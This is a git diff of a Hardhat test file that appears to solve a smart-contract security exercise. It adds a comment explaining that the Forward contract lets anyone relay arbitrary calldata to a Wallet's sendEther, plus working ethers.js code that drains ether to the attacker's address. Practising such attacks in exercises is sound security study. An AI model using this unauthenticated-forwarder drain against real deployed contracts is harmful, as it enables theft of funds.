@@ -36,7 +36,29 @@ describe(NAME, function () {
       );
     });
 
-    it("conduct your attack here", async function () {});
+    /**
+     * The original desgin for Forward contract I think is transfer the rights of executing the sendEther in Wallet to Forward Contract itself.
+     * And only Forward contract can call the sendEther function, but its obviously that there no check that Forward funtion can build any arbtrary address
+     * and amount while calling the sendEther funciton. And there are no check who can call Forward contract's functionCall.
+     * 
+     * So, the attack can input its address and the amount they want to withdraw while calling the Forward contract's functionCall. So as to withdraw all the Wallet's eth balance.
+     */
+    it("conduct your attack here", async function () {
+
+
+     // abi.encodSignature("sendEther(address, uint256),msg.sender,1 ether")
+      let ABI = [
+        "function sendEther(address destination, uint256 amount)"
+      ];
+      let iface = new ethers.utils.Interface(ABI);
+
+      let encodeData =  iface.encodeFunctionData("sendEther", [attackerWallet.address, ethers.utils.parseEther("1") ])
+      console.log("abiEncodeData:",encodeData);
+
+      await  forwarderContract.connect(attackerWallet).functionCall(walletContract.address,encodeData);
+      // reference: https://github.com/ethers-io/ethers.js/issues/478#issuecomment-495814010
+
+    });
 
     after(async function () {
       const attackerWalletBalanceAfter = await ethers.provider.getBalance(
